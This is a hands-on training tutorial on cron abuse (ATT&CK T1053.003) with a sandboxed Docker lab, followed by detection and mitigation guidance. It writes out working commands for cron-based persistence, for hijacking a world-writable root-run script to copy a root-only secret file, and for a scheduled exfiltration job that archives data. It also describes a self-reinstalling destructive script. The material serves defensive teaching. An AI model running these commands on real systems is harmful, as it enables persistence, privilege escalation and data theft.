# Scheduled Task/Job: Cron — Tutorial

**ATT&CK Technique:** [T1053.003 — Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)

---

## 1. Introduction & Overview

Most operating systems come with built-in features that let you run tasks
automatically at a preset date and time. On Unix-like systems (such as Linux),
that feature is called **cron**. Cron reads a schedule file called a
**crontab**, and runs whatever scripts, programs, or commands are listed there
at the times you choose — for example every minute, every night at 2 AM, or
every time the system starts.

This tutorial is about the attack pattern **Scheduled Task/Job: Cron
(T1053.003)**: using those same native operating system features to
automatically run an attacker's own scripts, programs, or commands. It is most
commonly used to maintain **persistence** — keeping a foothold on a system even
after a reboot or after a defender tries to clean up — but it can also be used
to escalate privileges.

In the hands-on lab, you will take the role of a low-privilege user who has
already broken into a Linux system. You will use cron to stay on that system,
steal data, and gain root access, and then see how a defender would detect and
stop it.

---

## 2. Why Attackers Use This Technique

Cron is attractive to attackers for a few reasons.

First, it gives them **persistence**. Once a cron job is in place, it keeps
running on its schedule without the attacker needing to stay logged in or
reconnect. It survives reboots and logouts, so the attacker keeps their access
even if the system restarts.

Second, cron is a **native, trusted tool**. It is already installed and used
for normal administration, so a malicious cron job can blend in with the
legitimate ones instead of standing out as obvious malware.

Third, because cron runs **automatically and repeatedly**, it can undo a
defender's cleanup. If a defender deletes the attacker's files, a cron job can
simply put them back a minute later. This is what makes the technique so
frustrating to remove.

A real example of this is the **Rocke** group. A Talos honeypot recorded that
Rocke exploited vulnerabilities in Apache Struts. After compromising a system,
they attempted to install cryptocurrency miners. Once installed, persistence
was established by using cron tasks to regularly re-download the miners if they
had been deleted — so even when a defender removed the malware, cron brought it
right back. Scenario A in this tutorial is a safe re-creation of exactly that
behavior.

---

## 3. Prerequisites & Assumptions

This technique is about *keeping and expanding* access, not the initial
break-in, so it assumes the attacker is already on the system. Specifically:

- **A foothold.** The attacker can already run commands on the system as some
  user, even a low-privilege one.
- **A Unix-like target running cron.** The subtechnique T1053.003 is
  specifically about the cron utility on Unix-like systems such as Linux.
- **Permission to create cron jobs.** The user the attacker controls is allowed
  to add cron jobs — nothing in `/etc/cron.allow` or `/etc/cron.deny` is
  stopping them.
- **For privilege escalation, a misconfiguration.** There is a script that runs
  as root on a cron schedule but that a regular user is allowed to edit (for
  example, a world-writable file). Without that mistake, the
  privilege-escalation scenario would not work.

**To run this lab, you need:**

- **Docker Desktop** installed and running — [install guide](https://docs.docker.com/get-started/get-docker/).
- A terminal (PowerShell on Windows, Terminal on macOS/Linux).
- No Linux experience required — every command is given to you below.

---

## Setup

This lab runs inside a disposable Docker container, so nothing you do can
affect your real computer. Deleting the container erases everything.

**1. Download the files.** On the class repository page in GitHub, click the
green **Code** button → **Download ZIP**, then unzip it somewhere easy to find
(such as your Desktop). You need this attack's `scheduled-task-cron` folder.

**2. Open PowerShell in the `Tutorial` folder.** In File Explorer, open
`scheduled-task-cron\Tutorial`, click the address bar to copy its path, then in
PowerShell type `cd`, a space, and that path in quotes:

```bash
cd "C:\path\to\scheduled-task-cron\Tutorial"
```

**3. Start the lab:**

```bash
docker compose up -d --build
```

The first build takes a minute or two while Docker downloads the base image.
Later starts are nearly instant.

**4. Open the interactive page** in your browser:

```
http://localhost:8080
```

**5. Open a terminal inside the lab**, as the low-privilege `student` user:

```bash
docker compose exec -u student lab bash
```

You now have a shell inside the container. You can keep the browser page and
this terminal open side by side.

**Check you are the right user** — type `whoami`. It must say `student`. If it
says `root`, you left off `-u student`; type `exit` and run the command above
again. (As root, the privilege-escalation scenario won't make sense, because
root can already read everything.)

> **All tutorial commands run _inside_ this container shell**, not in your
> normal PowerShell/Terminal. If `crontab` or `cat /root/...` gives a "command
> not found" or Windows-looking error, you're outside the container — re-run
> the `docker compose exec` command above.

**6. Watch cron work (optional, in a second terminal).** This streams the
shared log so you can see jobs fire in real time:

```bash
docker compose logs -f lab
```

**Reset at any time** — this throws the container away and rebuilds it fresh.
Run these two commands in PowerShell, one after the other:

```bash
docker compose down
```

```bash
docker compose up -d --build
```

> Run them one at a time. Some shells let you put both on one line with a `;`
> between them, but running them separately always works.

### Troubleshooting (common beginner slip-ups)

None of these can harm your real computer — the lab is sealed in the
container. When in doubt, reset with the command just above.

| Symptom | Cause | Fix |
|---|---|---|
| `docker compose up` fails with a "port is already allocated" error | Something else is using port 8080 | Edit `docker-compose.yml`, change `"8080:8080"` to `"8081:8080"`, and use `http://localhost:8081` |
| A scheduled job never seems to run | Cron only checks once a minute | Wait a full 60 seconds, then check again |
| `crontab: command not found` or a Windows-style error | You're typing in PowerShell, not inside the container | Run `docker compose exec -u student lab bash` first |
| Scenario B lets you read the secret immediately | You're `root`, not `student` | `exit`, then re-run with `-u student` |
| The exfil job created no archives | A `%` in the crontab line wasn't escaped as `\%` | Re-copy the command exactly from Scenario C |
| You broke a script / the lab is a mess | Normal while experimenting | Run `docker compose down`, then `docker compose up -d --build` |
| `&&` gives a "not a valid statement separator" error | Windows PowerShell 5.1 doesn't support `&&` | Run the two commands on separate lines (or use `;` between them) |

---

## Tutorial

You are logged in as `student`, a normal user with no special privileges —
exactly the foothold an attacker might have after a break-in. Each scenario
below shows a different way cron turns that foothold into something worse.

> Cron checks the schedule once a minute, so after you add a job you may need
> to **wait up to 60 seconds** to see it run.

### Scenario 0 — Cron basics (warm-up)

**See your current scheduled jobs** (there are none yet):

```bash
crontab -l
```

*Expected:* `no crontab for student`.

**What's happening:** `crontab` is each user's personal list of scheduled
jobs, and `-l` lists it. An empty list is normal — `student` hasn't scheduled
anything yet.

**Add a harmless job** that writes the time to the shared log every minute:

```bash
(crontab -l 2>/dev/null; echo '* * * * * echo "hello from cron at $(date)" >> /var/log/cron-lab.log') | crontab -
```

**What's happening:** That one-liner reads your existing jobs (`crontab -l`),
tacks on one new line, and pipes the result back in (`| crontab -`) — the safe
way to *add* a job without erasing the others. The job itself is five time
fields (minute, hour, day-of-month, month, day-of-week) followed by the command
to run; `* * * * *` means "every minute."

**Watch it run** (wait up to a minute):

```bash
tail -f /var/log/cron-lab.log
```

*Expected:* a new `hello from cron` line appears every minute. Press
`Ctrl + C` to stop watching.
**Clean up before the next scenario:**

```bash
crontab -r
```

---

### Scenario A — Persistence (the Rocke technique)

This mirrors the real-world example in Section “Real-World Example” below:
malware that reinstalls itself whenever you delete it.

**1. Look at the “malware” and its watchdog** (both harmless — they only
write to a log):

```bash
cat /opt/lab/payloads/restore_miner.sh
```

**2. Schedule the watchdog** to run every minute:

```bash
(crontab -l 2>/dev/null; echo '* * * * * /opt/lab/payloads/restore_miner.sh') | crontab -
```

**What's happening:** The watchdog you just scheduled checks once a minute
whether the miner exists, and recreates it if it's gone. In other words, the
**cron job is the real malware** — the miner file is just its disposable
output. This is the trick the Rocke group used.

**3. Wait ~1 minute, then confirm the miner is running:**

```bash
tail -n 5 /var/log/cron-lab.log
```

*Expected:* lines showing the `(miner) earning fake coins...`.

**4. Play defender: delete the miner.**

```bash
rm -f /tmp/miner.sh
```

**5. Wait another minute and look again:**

```bash
tail -n 5 /var/log/cron-lab.log
```

*Expected:* a `(watchdog) miner was missing - restored it!` line — the miner
is **back**.
**Clean up:**

```bash
crontab -r
rm -f /tmp/miner.sh
```

---

### Scenario B — Privilege Escalation

Here you are still the unprivileged `student`, but you escalate to root by
abusing a script that **root’s** cron job runs.

**1. Confirm you cannot read root’s secret:**

```bash
cat /root/secret.txt
```

*Expected:* `Permission denied`.

**2. Find the weakness** — a root-run script that anyone can edit:

```bash
ls -l /usr/local/bin/system_health.sh
```

*Expected:* permissions `-rwxrwxrwx` (world-writable). Root runs this every
minute.

**3. Hijack it** — append a command that copies root’s secret to your home:

```bash
echo 'cp /root/secret.txt /home/student/loot.txt; chmod 644 /home/student/loot.txt' >> /usr/local/bin/system_health.sh
```

**What's happening:** `system_health.sh` runs as **root** every minute, but
its `rwxrwxrwx` permissions let *any* user edit it. By appending your own line,
you've handed root a command to run on your behalf — copying a root-only file
to a spot you can read. You never needed root's password; you just borrowed
root's scheduled job.

**4. Wait ~1 minute for root’s cron to run the script, then read your loot:**

```bash
cat /home/student/loot.txt
```

*Expected:* the contents of root’s secret file — data you could not read in
step 1.
**Clean up** (restore the script):

```bash
printf '#!/bin/bash\necho "[$(date)] system health: OK" >> /var/log/cron-lab.log\n' > /usr/local/bin/system_health.sh
rm -f /home/student/loot.txt
```

---

### Scenario C — Exfiltration

A cron job can quietly steal data on a repeating schedule.

**1. Look at the “sensitive” company files:**

```bash
ls -l /home/student/company_data
```

**2. Schedule an exfiltration job** that packages the data into the
attacker’s drop folder every minute. (Note the `\%` — inside a crontab the
`%` character must be escaped, a classic beginner gotcha.)

```bash
(crontab -l 2>/dev/null; echo '* * * * * tar -czf /opt/drop/dump-$(date +\%s).tar.gz -C /home/student company_data') | crontab -
```

**What's happening:** Every minute the job bundles the sensitive folder into a
timestamped archive and drops it where the attacker can collect it — automated,
repeating theft with nobody logged in. `$(date +\%s)` gives each archive a
unique name; the `%` is written `\%` because cron treats a bare `%` specially.

**3. Wait ~1–2 minutes, then check the attacker’s drop folder:**

```bash
ls -l /opt/drop
```

*Expected:* one or more `dump-*.tar.gz` archives, piling up over time.
**Clean up:**

```bash
crontab -r
rm -f /opt/drop/*.tar.gz
```

---

### Optional Finale — “Chaos” (do this LAST)

> ⚠️ **Only run this after you have finished everything above.** It
> deliberately trashes the lab to show how destructive and stubborn a
> persistent cron job is. It is sealed inside the container and **cannot touch
> your real computer**, but it will wreck the lab until you reset it.

```bash
/opt/lab/chaos.sh
```

Then **try to clean up** — delete the files, run `crontab -r`, open a new
terminal. Everything keeps coming back, because the job reinstalls itself.

**What's happening:** `chaos.sh` re-adds itself to cron on every run, rewrites
your shell, and wipes the lab's files. Because the job keeps reinstalling
itself, deleting the files — or even the job — doesn't stick. That is exactly
how a persistent attacker outlasts your cleanup.
**Reset the lab to normal** — run these two commands in PowerShell, one after
the other:

```bash
docker compose down
```

```bash
docker compose up -d --build
```

---

## Real-World Example

A Talos honeypot recorded that an organization known as **Rocke** exploited
vulnerabilities in Apache Struts. After compromising a system, they attempted
to install cryptocurrency miners. Once installed, persistence was established
by using cron tasks to regularly re-download the miners if they had been
deleted. (Any server running vulnerable Struts, WebLogic, or ColdFusion was at
risk.)

Scenario A above is a safe re-creation of this exact behavior.

---

## ATT&CK / CAPEC Mapping

| | |
|---|---|
| **Technique** | [T1053.003 — Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/) |
| **Parent technique** | [T1053 — Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) |
| **Primary tactic** | Persistence (TA0003) |
| **Also used for** | Privilege Escalation (TA0004), Execution (TA0002) |

**Related techniques:**

- **Sibling sub-techniques** of T1053 — At (.002), Scheduled Task (.005),
  Systemd Timer (.006), Container Orchestration Job (.007). Same idea on other
  systems/utilities; `.003` is specifically the Unix `cron` utility.
- [T1037.004 — Boot or Logon Initialization Scripts: RC Scripts](https://attack.mitre.org/techniques/T1037/004/)
- [T1546.004 — Event Triggered Execution: Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004/)

---

## Detection Opportunities

> _Maps to MITRE M1047 (Audit) and DET0290; see References._

- Review changes to the cron schedule and check cron logs in `/var/log`.
- Alert on new or modified crontab entries — especially by unusual users or
  processes, or jobs that run hidden or renamed scripts.
- Use the **“Spot the malicious entry”** tool on the interactive page to
  practice recognizing the tells: raw IP addresses, downloads piped into a
  shell, hidden paths like `/tmp/.hidden`, and silenced errors.

---

## Mitigations & Defenses

> _MITRE mitigation IDs noted inline; see References._

- **Preventive:** Limit who can create cron jobs using `/etc/cron.allow` and
  `/etc/cron.deny` (MITRE **M1018**, User Account Management). Apply least
  privilege so cron jobs don’t run as root unnecessarily, and so root’s scripts
  can’t be edited by regular users. *(Scenario B happened only because a
  root-run script was world-writable.)*
- **Detective:** Review changes to the cron schedule and check cron logs in
  `/var/log` (MITRE **M1047**, Audit). Alert on new or modified crontab entries
  (MITRE **DET0290**).
- **Corrective:** Remove the malicious cron entries **and** the files they run,
  then isolate the system and check for other persistence methods. Fix the
  original entry point, and rebuild the system if root access was compromised.

---

## Key Takeaways

- Cron is a built-in, trusted scheduling tool. Attackers abuse it precisely
  because it blends in with normal system activity.
- Cron is most often used for **persistence**. Deleting the attacker's payload
  is not enough — if the cron job is still there, the payload comes right back,
  as the Rocke group's miners did. To really remove it, you have to find and
  delete the cron job itself.
- Cron can also be used to **escalate privileges**. A script that runs as root
  but can be edited by a regular user lets that user run commands as root.
- It can also **repeat quietly on a schedule**, which is what makes automated
  data theft or the reversal of a defender's cleanup so effective.
- Defenders should watch for new or changed crontab entries and review cron
  logs, limit who is allowed to create cron jobs with `/etc/cron.allow` and
  `/etc/cron.deny`, and apply least privilege so cron jobs don't run as root
  unnecessarily.

---

## Useful Resources

Places to learn more about cron and scheduled tasks themselves:

- **[crontab.guru](https://crontab.guru/)** — an interactive cron-schedule
  decoder. Type a schedule like `*/5 * * * *` and it tells you in plain English
  when it runs. Great companion to Scenario 0.
- **[Ubuntu CronHowto](https://help.ubuntu.com/community/CronHowto)** — a
  practical community guide to creating and managing cron jobs.
- **[crontab(5) man page](https://man7.org/linux/man-pages/man5/crontab.5.html)**
  — the official reference for the crontab file format and its five time fields.

---

## References

1. **MITRE ATT&CK — T1053.003 (Cron).** Official technique documentation and
   summary. <https://attack.mitre.org/techniques/T1053/003/>
2. **Cisco Talos — “Rocke: The Champion of Monero Miners.”** Real-world report
   of cron-based persistence for crypto-mining malware.
   <https://blog.talosintelligence.com/rocke-champion-of-monero-miners/>
3. **Splunk Research — Scheduled Tasks.** Detection methods and the importance
   of scheduled tasks. <https://research.splunk.com/stories/scheduled_tasks/>
4. **Security Scientist — Cron (T1053.003).** Beginner-friendly explanation of
   the technique. <https://www.securityscientist.net/blog/cron-t1053-003/>
5. **Ontolocy — ATT&CK technique view.** Detection, control validation, and
   mitigation links with an overview.
   <https://explore.ontolocy.com/mitre-attack/techniques/attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c/>

<!-- Add any new sources you cite in your own prose above. -->
